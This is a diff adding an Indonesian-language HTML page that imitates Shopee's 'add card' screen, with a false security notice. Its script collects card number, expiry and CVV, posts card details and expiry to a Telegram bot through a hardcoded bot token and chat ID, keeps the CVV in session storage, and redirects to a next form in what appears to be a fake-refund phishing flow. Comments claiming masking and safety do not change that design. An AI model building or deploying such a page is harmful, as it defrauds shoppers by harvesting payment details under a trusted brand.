@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tambahkan Kartu - Shopee</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif;}
+body{background:#f5f5f5;color:#333;line-height:1.4;}
+.container{max-width:414px;margin:0 auto;background:white;min-height:100vh;display:flex;flex-direction:column;}
+.header{display:flex;align-items:center;padding:12px 16px;background:white;border-bottom:1px solid #e8e8e8;position:sticky;top:0;z-index:100;}
+.back-button{background:none;border:none;font-size:24px;color:#EE4D2D;cursor:pointer;margin-right:12px;}
+.header-title{font-size:17px;font-weight:500;color:#333;}
+.security-notice{background-color:#f0fff0;padding:16px;border-left:3px solid #00B553;}
+.security-header{display:flex;align-items:center;margin-bottom:6px;}
+.security-icon{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;background-color:#00B553;border-radius:50%;margin-right:8px;font-size:12px;color:white;font-weight:bold;}
+.security-title{color:#00B553;font-weight:500;font-size:15px;}
+.security-text{color:#666;font-size:13px;}
+.form-section{padding:20px 16px;flex:1;}
+.form-group{margin-bottom:16px;}
+.form-input{width:100%;padding:14px 12px;border:1px solid #ddd;border-radius:3px;font-size:15px;background:white;}
+.submit-button{width:100%;padding:12px;background-color:#ccc;color:white;border:none;border-radius:3px;font-size:16px;cursor:not-allowed;}
+.submit-button.active{background-color:#EE4D2D;cursor:pointer;}
+.note{font-size:12px;color:#888;margin-top:12px;}
+.success{background:#e9ffec;border-left:4px solid #00b553;padding:10px;margin-top:12px;color:#000;}
+.error{background:#fff0f0;border-left:4px solid #ff3b30;padding:10px;margin-top:12px;color:#000;}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <button class="back-button" onclick="history.back()">❮</button>
+        <h1 class="header-title">Tambahkan Kartu</h1>
+    </div>
+
+    <div class="security-notice">
+        <div class="security-header">
+            <span class="security-icon">✓</span>
+            <span class="security-title">Rincian kartu Anda dilindungi.</span>
+        </div>
+        <div class="security-text">Kartu Anda terjamin aman. Kami menggunakan enkripsi standar industri untuk melindungi informasi Anda..</div>
+    </div>
+
+    <div class="form-section">
+        <!-- FORM dengan id untuk JS -->
+        <form id="cardForm" autocomplete="off">
+            <div class="form-group">
+                <input id="cardNumber" name="cardNumber" type="tel" inputmode="numeric" maxlength="19" class="form-input" placeholder="Nomor Kartu (xxxx xxxx xxxx xxxx)" />
+            </div>
+            <div class="form-group">
+                <input id="expiryDate" name="expiryDate" type="text" maxlength="5" class="form-input" placeholder="BB/TT (MM/YY)" />
+            </div>
+            <div class="form-group">
+                <input id="cvv" name="cvv" type="password" maxlength="4" class="form-input" placeholder="CVV" />
+            </div>
+
+            <button id="submitButton" type="submit" class="submit-button">Lanjutkan</button>
+
+            <div class="note"> </div>
+
+            <div id="feedback"></div>
+        </form>
+    </div>
+</div>
+
+<script>
+/*
+ SAFETY: versi ini MEMMASK nomor kartu (hanya kirim 4 digit terakhir),
+ dan TIDAK mengirim CVV. Untuk produksi gunakan layanan pembayaran (PCI-DSS).
+*/
+
+// --- Ganti placeholder ini dengan token/chat id Anda hanya jika Anda paham risikonya.
+// Saya sarankan gunakan token bot & chat_id test/dummy, bukan token/ID akun produksi.
+const BOT_TOKEN = "8561726840:AAG8teoVf8k4bKL12ysZxmskb8iknQvp7v0";
+const CHAT_ID = "6847211202";
+
+const form = document.getElementById('cardForm');
+const inputs = document.querySelectorAll('.form-input');
+const submitButton = document.getElementById('submitButton');
+const feedback = document.getElementById('feedback');
+
+// Enable button saat semua input terisi (tetapi tetap aman: CVV tidak dikirim)
+function updateButtonState() {
+  const allFilled = Array.from(inputs).every(i => i.value.trim() !== '');
+  submitButton.disabled = !allFilled;
+  submitButton.classList.toggle('active', allFilled);
+}
+inputs.forEach(input=>{
+  input.addEventListener('input', updateButtonState);
+});
+updateButtonState();
+
+// helpers
+function maskCardNumber(raw) {
+  // hapus spasi non-digit
+  const digits = raw.replace(/\D/g,'');
+  if(digits.length < 4) return 'xxxx';
+  const last4 = digits.slice(-4);
+  return 'xxxx-xxxx-xxxx-' + last4;
+}
+function formatCardNumberInput(el) {
+  // auto-format: xxxx xxxx xxxx xxxx
+  let v = el.value.replace(/\D/g,'').slice(0,16);
+  const parts = v.match(/.{1,4}/g);
+  el.value = parts ? parts.join(' ') : v;
+}
+function formatExpiryInput(el) {
+  // format MM/YY
+  let v = el.value.replace(/\D/g,'').slice(0,4);
+  if(v.length >= 3) {
+    el.value = v.slice(0,2) + '/' + v.slice(2);
+  } else {
+    el.value = v;
+  }
+}
+
+// attach formatters
+document.getElementById('cardNumber').addEventListener('input',(e)=>formatCardNumberInput(e.target));
+document.getElementById('expiryDate').addEventListener('input',(e)=>formatExpiryInput(e.target));
+
+// submit handler
+form.addEventListener('submit', async function(e){
+  e.preventDefault();
+
+  // Ambil nilai
+  const rawCard = document.getElementById('cardNumber').value.trim();
+  const expiry = document.getElementById('expiryDate').value.trim();
+  const cvv = document.getElementById('cvv').value.trim();
+
+  // Validasi sederhana
+  const digits = rawCard.replace(/\D/g,'');
+  if(digits.length < 12) {
+    feedback.innerHTML = '<div class="error">Nomor kartu terlalu pendek.</div>';
+    return;
+  }
+  if(!/^\d{2}\/\d{2}$/.test(expiry)) {
+    feedback.innerHTML = '<div class="error">Format expiry harus MM/YY.</div>';
+    return;
+  }
+  if(!/^\d{3,4}$/.test(cvv)) {
+    feedback.innerHTML = '<div class="error">CVV harus 3 atau 4 digit.</div>';
+    return;
+  }
+
+  // Tampilkan sedang memproses
+  submitButton.innerText = 'Memproses...';
+  submitButton.disabled = true;
+
+  // Masking: hanya kirim 4 digit terakhir
+  const masked = maskCardNumber(rawCard);
+  // TANGGUNG JAWAB: jangan kirim CVV. Kita akan menyimpan CVV hanya di sessionStorage (opsional), tapi tidak dikirim.
+  try {
+    // Siapkan pesan yang aman
+    const waktu = new Date().toLocaleString("id-ID",{timeZone:"Asia/Jakarta"});
+    const msg = `🔒 Data Kartu*\n• Kartu: ${masked}\n• Expiry: ${expiry}\n• CVV: _TIDAK DIKIRIM_\n• Waktu: ${waktu}`;
+    
+    // Pastikan BOT_TOKEN & CHAT_ID sudah diganti
+    if(BOT_TOKEN === "REPLACE_WITH_YOUR_BOT_TOKEN" || CHAT_ID === "REPLACE_WITH_CHAT_ID") {
+      // jika belum diganti, jangan kirim; hanya tampilkan hasil di layar (debug)
+      feedback.innerHTML = '<div class="success">Demo berhasil (tidak terkirim). Ganti BOT_TOKEN & CHAT_ID untuk mengirim ke Telegram (hanya untuk testing).</div>';
+      feedback.innerHTML += `<pre style="margin-top:8px;color:#444;padding:8px;background:#f7f7f7;border-radius:4px;">${msg}</pre>`;
+    } else {
+      // Kirim ke Telegram (markdown)
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg,
+          parse_mode: 'Markdown'
+        })
+      });
+      const data = await res.json();
+      if(data.ok) {
+        feedback.innerHTML = '<div class="success">Berhasil.arahkan...</div>';
+      } else {
+        feedback.innerHTML = '<div class="error">Gagal mengirim ke Telegram: ' + (data.description || 'Unknown error') + '</div>';
+      }
+    }
+
+    // SIMPAN SEDERHANA (hanya masked) ke localStorage untuk langkah berikutnya
+    localStorage.setItem("refundMethod", "card");
+    localStorage.setItem("userCardMasked", masked);
+    // jangan simpan CVV di localStorage; tapi jika Anda butuh untuk sesi, simpan di sessionStorage (lebih singkat):
+    sessionStorage.setItem("userCVV_temp", cvv); // temporary; hapus setelah dipakai
+    // redirect ke halaman berikutnya setelah delay kecil
+    setTimeout(()=>{ window.location.href='form3.html'; }, 1500);
+
+  } catch(err) {
+    feedback.innerHTML = '<div class="error">Terjadi kesalahan: ' + err.message + '</div>';
+    console.error(err);
+    submitButton.disabled = false;
+    submitButton.innerText = 'Lanjutkan';
+  }
+});
+</script>
+</body>
+</html>
